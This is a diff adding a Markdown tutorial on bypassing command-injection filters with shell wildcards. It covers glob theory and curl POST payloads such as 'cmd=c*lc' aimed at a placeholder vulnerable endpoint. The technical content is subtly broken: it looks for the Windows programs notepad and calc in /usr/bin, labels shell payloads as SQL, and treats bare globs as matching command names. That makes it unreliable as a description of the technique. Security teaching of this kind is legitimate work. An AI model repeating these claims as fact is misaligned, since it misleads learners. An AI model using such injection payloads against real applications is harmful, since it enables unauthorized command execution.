@@ -1,0 +1,106 @@
+---
+title: Bypass Command Injection Using Wildcards
+description: Learn to exploit command injection vulnerabilities by bypassing input
+  filters using shell wildcards for unauthorized command execution.
+keywords:
+- command injection
+- wildcard bypass
+- shell globbing
+- input filter evasion
+- web application security
+- pattern matching exploit
+- cybersecurity
+---
+
+# Bypass With Wildcards
+
+## Context
+
+The technique of bypassing with wildcards is a method commonly used in command injection attacks against web applications. Attackers exploit input filters by leveraging shell wildcards, also known as globbing patterns, to execute commands that would otherwise be blocked by input validation mechanisms. This guide assumes you are familiar with how wildcards work in Unix-like shells, the basics of command injection, and executing commands through injection points.
+
+## Theory
+
+### Wildcard Mechanisms in Shells
+
+Wildcards are special characters used in shell environments to match filenames or arguments. The most commonly used wildcards include:
+- `*`: Matches zero or more characters.
+- `?`: Matches a single character.
+- `[]`: Matches any one of the enclosed characters.
+
+Shells expand these wildcards before executing a command, which means they can be used to circumvent input filters by constructing alternates of filtered command names.
+
+### Globbing Patterns for Filter Bypass
+
+Globbing refers to the shell's process of expanding wildcard patterns into matching filenames or arguments. In the context of a filter bypass, attackers can craft payloads using these patterns to circumvent restrictions:
+- If the application blocks the word "notepad," using a pattern like `*pad` or `n*pad` may still allow the unintended execution if such a file exists on the system.
+
+### Command Injection Bypass via Wildcards
+
+Attackers typically follow these steps to exploit wildcards in command injection scenarios:
+1. **Identify Filter Restrictions**: Determine which command names or strings are being filtered.
+2. **Enumerate Potential Matches**: Use command-line tools to find binaries or files that match desired patterns.
+3. **Inject Wildcard Payloads**: Use wildcard patterns to bypass input filters, allowing the shell to expand these patterns into executable command names.
+
+## Practice
+
+### Bypassing Command Filters Using Shell Wildcards (Globbing)
+
+To exploit a scenario where the application blocks the string "notepad":
+
+- Enumerate available binaries to confirm "notepad" exists:
+  ```bash
+  ls /usr/bin/ | grep pad
+  ```
+
+- Use the wildcard payload as input to trigger expansion:
+  ```sql
+  *pad
+  ```
+
+- Inject the payload into the vulnerable web application endpoint:
+  ```bash
+  curl -X POST -d 'cmd=*pad' http://target-app/vuln-endpoint
+  ```
+
+- Check if "notepad" was successfully opened or executed.
+
+### Bypassing Filters for Calculator Using Wildcard Patterns
+
+If "calc" is blacklisted:
+
+- Use a wildcard pattern that matches "calc":
+  ```sql
+  c*lc
+  ```
+
+- Inject this pattern to trigger command execution:
+  ```bash
+  curl -X POST -d 'cmd=c*lc' http://target-app/vuln-endpoint
+  ```
+
+- Observe the execution of the calculator application.
+
+### General Globbing Bypass for Arbitrary Commands
+
+To bypass filters for arbitrary commands:
+
+- Identify potential wildcard patterns:
+  ```bash
+  ls /usr/bin/ | grep <pattern>
+  ```
+
+- Use a single-character wildcard for a command like "calc":
+  ```sql
+  ?alc
+  ```
+
+- Inject the pattern to achieve execution:
+  ```bash
+  curl -X POST -d 'cmd=?alc' http://target-app/vuln-endpoint
+  ```
+
+- Confirm command execution by observing expected outcomes.
+
+## Tools
+
+- **curl**: A command-line tool used to transfer data with URLs, essential for injecting payloads into web application endpoints during these exercises.
